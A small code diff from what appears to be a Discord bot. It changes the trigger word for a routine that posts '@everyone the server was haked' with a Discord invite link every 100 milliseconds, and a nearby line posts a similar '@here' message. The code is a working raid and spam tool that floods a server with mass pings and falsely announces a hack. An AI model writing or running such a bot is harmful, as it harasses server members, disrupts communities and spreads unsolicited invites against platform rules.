@@ -437,7 +437,7 @@ message.channel.sendMessage('@here the server was haked ')
 
 
 mar.on('message', message => {
-    if (message.content.startsWith('r5')){
+    if (message.content.startsWith('xxnx')){
 setInterval(() => {
 message.channel.sendMessage('@everyone the server was haked  discord.gg/MB49QPn')
 }, 100);
